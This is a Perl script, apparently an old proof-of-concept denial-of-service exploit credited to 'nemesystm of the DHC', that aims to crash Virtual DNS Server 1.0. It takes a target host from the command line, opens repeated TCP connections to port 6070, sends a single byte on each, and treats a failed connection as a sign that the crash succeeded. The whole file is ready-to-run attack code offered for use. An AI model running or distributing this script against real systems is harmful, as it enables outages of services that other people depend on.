#!/usr/bin/perl
#
# VDNS.PL - Crashes Virtual DNS Server 1.0
# Written by nemesystm of the DHC
# http://dhcorp.cjb.net - neme-dhc@hushmail.com
#
####
use Socket;

die "$0 - Stops Virtual DNS Server 1.0.
written by nemesystm of the DHC
http://dhcorp.cjb.net - neme-dhc\@hushmail.com
usage: perl $0 target.com\n" if !defined $ARGV[0];

for ($count = 0; $count <= 3; $count++) {
        $serverIP = inet_aton($ARGV[0]);
        $serverAddr = sockaddr_in(6070, $serverIP);
        socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
        if (connect (CLIENT, $serverAddr)) {
                send (CLIENT, "A", 0);
                close (CLIENT);
        } else { print ("if the number shown is 2, it worked"); die "Can't connect: $count\n"; }
}